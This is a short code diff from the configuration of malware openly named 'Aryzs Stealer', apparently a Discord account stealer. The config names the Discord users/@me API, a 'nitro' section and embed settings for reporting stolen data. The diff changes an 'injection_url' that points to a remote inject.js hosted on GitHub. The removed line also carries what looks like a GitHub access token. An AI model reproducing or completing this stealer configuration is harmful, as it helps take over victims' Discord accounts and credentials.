@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Aryzs Stealer', 
   embed_icon: ''.replace(/ /g, '%20'), 
   embed_color: 3447704, 
-  injection_url: 'https://raw.githubusercontent.com/Emny6/apiinjectionlblalbla/main/inject.js?token=GHSAT0AAAAAABVNWNLLW4GSZL2QOBCEIX7KYVWNEKQ', 
+  injection_url: 'https://github.com/Emny6/apiinjectionlblalbla/blob/main/inject.js', 
  
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
